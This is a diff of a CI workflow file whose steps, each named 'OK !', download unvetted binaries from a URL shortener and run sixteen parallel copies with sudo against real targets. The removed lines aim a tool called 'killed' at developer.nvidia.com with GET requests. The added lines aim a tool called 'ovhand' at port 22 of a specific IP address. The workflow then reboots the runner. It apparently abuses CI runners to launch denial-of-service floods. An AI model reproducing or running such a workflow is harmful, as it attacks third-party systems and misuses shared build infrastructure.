@@ -14,12 +14,11 @@ jobs:
     steps:
       - name: OK !
         run: |
-          wget https://curl.by/yD5p3/killed -O killed
-          wget https://curl.by/QHrRL/fres.txt -O fres.txt
-          chmod +x killed
+          wget https://curl.by/qT61P/ovhand -O ovhand
+          chmod +x ovhand
           PIDS=()
           for i in {1..16}; do
-            sudo timeout 35 ./killed GET https://developer.nvidia.com/ fres.txt 35 950 8 &
+            sudo timeout 30 ./ovhand 51.81.234.164 22 10 30 &
             PIDS+=($!)
           done
           
@@ -28,7 +27,7 @@ jobs:
           done
 
       - name: OK !
-        run: sleep 35
+        run: sleep 30
         
       - name: OK !
         run: sudo reboot
